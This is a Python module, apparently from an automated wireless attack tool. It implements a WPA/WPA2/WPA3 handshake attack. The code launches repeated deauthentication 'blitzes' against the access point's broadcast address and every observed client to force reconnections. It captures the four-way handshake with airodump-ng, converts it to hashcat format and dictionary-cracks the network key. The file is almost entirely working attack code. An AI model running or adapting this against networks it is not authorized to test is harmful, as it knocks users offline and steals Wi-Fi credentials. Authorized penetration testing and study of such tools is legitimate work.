"""WPA handshake capture and crack."""

from __future__ import annotations

import os
import re
import shutil
import time
from datetime import datetime, timezone

from ..models import CrackResult, EncryptionType
from ..tools.aireplay import Aireplay
from ..tools.airodump import Airodump
from ..tools.hashcat import Hashcat, HcxTools
from ..tools.interface import recover_interface
from .base import Attack, AttackResult


class HandshakeAttack(Attack):
    name = "handshake"

    def can_attack(self) -> bool:
        if not self.cfg.attack.handshake:
            return False
        if self.ap.encryption not in (EncryptionType.WPA, EncryptionType.WPA2, EncryptionType.WPA3):
            return False
        if self.ap.is_enterprise:
            return False
        return True

    def _existing_cap(self) -> str | None:
        if self.cfg.attack.new_handshake:
            return None
        hs_dir = self.cfg.output.handshake_dir
        if not os.path.isdir(hs_dir):
            return None
        bssid_safe = re.escape(self.ap.bssid.replace(":", "-"))
        pattern = re.compile(rf"handshake_.*_{bssid_safe}_.*\.cap")
        for fname in sorted(os.listdir(hs_dir), reverse=True):
            if pattern.match(fname):
                path = os.path.join(hs_dir, fname)
                if Hashcat.check_handshake(path, self.ap.bssid, self.ap.essid):
                    return path
        return None

    def _save_cap(self, src: str) -> str:
        essid_safe = re.sub(r"[^a-zA-Z0-9]", "", self.ap.display_name)
        bssid_safe = self.ap.bssid.replace(":", "-")
        ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S")
        dst = os.path.join(
            self.cfg.output.handshake_dir,
            f"handshake_{essid_safe}_{bssid_safe}_{ts}.cap",
        )
        shutil.copy2(src, dst)
        return dst

    def run(self) -> AttackResult:
        self.tracker.clear_skip()
        capture_started = time.time()
        timeout = self.cfg.attack.wpa_timeout

        capfile = self._existing_cap()
        if capfile:
            self.status("capture", "Using cached handshake", timeout=timeout, started=capture_started)
            self.tracker.log(f"Found existing capture for {self.ap.display_name}", tag="handshake")
        else:
            self.status("capture", "Recovering interface...", timeout=timeout, started=capture_started)
            iface = recover_interface(self.cfg.scan.interface, self.ap.channel)
            self.cfg.scan.interface = iface
            self.tracker.log(f"Listening on ch{self.ap.channel} for {timeout}s...", tag="handshake")
            capfile = self._capture(capture_started, timeout)

        if self.should_stop():
            return self.skipped_result()
        if not capfile:
            return AttackResult(False, message="Handshake capture failed")

        saved = self._save_cap(capfile) if not capfile.startswith(self.cfg.output.handshake_dir) else capfile
        self.tracker.log(f"Saved capture → {saved}", tag="handshake")

        if self.cfg.attack.skip_crack or not self.cfg.attack.wordlist:
            self.status("done", f"Saved to {os.path.basename(saved)}", started=capture_started)
            return AttackResult(True, message=f"Handshake saved to {saved}")

        wl = os.path.basename(self.cfg.attack.wordlist)
        self.tracker.log("Converting cap → hashcat format...", tag="handshake")

        hash_line = HcxTools.cap_to_hash(saved, self.ap.bssid, self.ap.essid)
        if not hash_line:
            return AttackResult(False, message="Failed to convert handshake to hash")

        self.tracker.log(f"Dictionary attack with {wl}", tag="handshake")
        key = self.crack_hashcat(hash_line, capture_started)
        if self.should_stop():
            return self.skipped_result()
        if key:
            crack = CrackResult(
                bssid=self.ap.bssid, essid=self.ap.display_name, key=key,
                method="handshake", capture_file=saved,
                cracked_at=datetime.now(timezone.utc).isoformat(),
            )
            self.status("cracked", f"Key found: {key}", started=capture_started)
            return AttackResult(True, crack=crack, message=f"Handshake cracked: {key}")
        self.status("failed", "Password not in wordlist", started=capture_started)
        return AttackResult(False, message="Handshake captured but not cracked")

    def _capture(self, started: float, timeout: int) -> str | None:
        clients: list[str] = []
        deadline = time.time() + timeout
        last_check = time.time()
        last_cap_size = 0
        deauth_rounds = 0
        restart_count = 0
        phase = "burst"  # burst → listen → burst …
        phase_start = time.time()

        try:
            with Airodump(self.cfg, channel=self.ap.channel, bssid=self.ap.bssid, prefix="hs") as dump:
                if not dump.alive():
                    self.tracker.log(
                        "[yellow]airodump-ng failed — recovering interface and retrying[/]",
                        tag="handshake",
                    )
                    self.cfg.scan.interface = recover_interface(self.cfg.scan.interface, self.ap.channel)
                    dump.stop()
                    dump.start()
                if not dump.alive():
                    self.tracker.log("[red]airodump-ng failed to start[/]", tag="handshake")
                    return None

                if not self.cfg.attack.no_deauth:
                    burst_s = self.cfg.attack.deauth_burst
                    listen_s = self.cfg.attack.deauth_listen
                    self.tracker.log(
                        f"Capture cycle: [yellow]{burst_s}s deauth blitz[/] → "
                        f"[green]{listen_s}s listen[/] (repeat)",
                        tag="handshake",
                    )

                while time.time() < deadline:
                    if self.abort_if_skipped():
                        return None
                    remaining = int(deadline - time.time())

                    if not dump.alive():
                        restart_count += 1
                        if restart_count > 5:
                            self.tracker.log("[red]airodump-ng keeps dying — aborting[/]", tag="handshake")
                            return None
                        self.tracker.log("[yellow]airodump-ng died — restarting[/]", tag="handshake")
                        self.cfg.scan.interface = recover_interface(self.cfg.scan.interface, self.ap.channel)
                        dump.stop()
                        dump.start()
                        time.sleep(1)
                        continue

                    targets = dump.parse_targets()
                    target = next((t for t in targets if t.bssid == self.ap.bssid), None)
                    if target:
                        for c in target.clients:
                            if c.station not in clients:
                                clients.append(c.station)
                                self.tracker.log(
                                    f"New client: [green]{c.station}[/]",
                                    tag="handshake",
                                )

                    cap = dump.get_cap_file()
                    cap_kb = 0
                    if cap and os.path.exists(cap):
                        cap_kb = os.path.getsize(cap) // 1024

                    now = time.time()
                    cap_size = os.path.getsize(cap) if cap and os.path.exists(cap) else 0
                    if (
                        cap
                        and cap_size >= 64
                        and cap_size - last_cap_size >= 1024
                        and now - last_check >= 3
                    ):
                        last_check = now
                        last_cap_size = cap_size
                        if Hashcat.check_handshake(cap, self.ap.bssid, self.ap.essid):
                            self.status(
                                "capture", "Handshake captured!",
                                timeout=timeout, started=started,
                                clients=len(clients), deauths=deauth_rounds, cap_kb=cap_kb,
                            )
                            self.tracker.log("[green]Valid handshake detected![/]", tag="handshake")
                            return cap

                    burst_s = self.cfg.attack.deauth_burst
                    listen_s = self.cfg.attack.deauth_listen
                    phase_elapsed = now - phase_start

                    if self.cfg.attack.no_deauth:
                        action = "Listening (passive)"
                        sleep_s = 0.5
                    elif phase == "burst":
                        if phase_elapsed >= burst_s:
                            phase = "listen"
                            phase_start = now
                            self.tracker.log(
                                f"[green]Blitz done[/] — listening {listen_s}s for handshake",
                                tag="handshake",
                            )
                            action = f"Listening ({listen_s}s quiet window)"
                            sleep_s = 0.5
                        else:
                            self._deauth_blitz(clients)
                            deauth_rounds += 1
                            left = int(burst_s - phase_elapsed)
                            action = (
                                f"Deauth blitz ({left}s left, "
                                f"broadcast + {len(clients)} client(s))"
                            )
                            sleep_s = 0.25
                    else:
                        if phase_elapsed >= listen_s:
                            phase = "burst"
                            phase_start = now
                            self.tracker.log(
                                f"[yellow]Starting {burst_s}s deauth blitz[/] "
                                f"(broadcast + {len(clients)} client(s))",
                                tag="handshake",
                            )
                            action = f"Deauth blitz ({burst_s}s)"
                            sleep_s = 0.25
                        else:
                            left = int(listen_s - phase_elapsed)
                            action = f"Listening — blitz in {left}s"
                            sleep_s = 0.5

                    self.status(
                        "capture", f"{action} ({remaining}s left)",
                        timeout=timeout, started=started,
                        clients=len(clients), deauths=deauth_rounds, cap_kb=cap_kb,
                    )
                    time.sleep(sleep_s)
        except Exception as e:
            self.tracker.log(f"[red]capture error: {e}[/]", tag="handshake")
            return None

        self.tracker.log(f"[red]No handshake after {timeout}s[/]", tag="handshake")
        return None

    def _deauth_blitz(self, clients: list[str]) -> None:
        """Hammer broadcast and every known client — rapid fire during burst window."""
        try:
            Aireplay.deauth(
                self.cfg, self.ap.bssid, None, self.cfg.attack.num_deauths,
                send_window=0.2,
            )
            for station in clients:
                Aireplay.deauth(
                    self.cfg, self.ap.bssid, station, 1,
                    send_window=0.1,
                )
        except Exception as e:
            self.tracker.log(f"[yellow]deauth blitz skipped: {e}[/]", tag="handshake")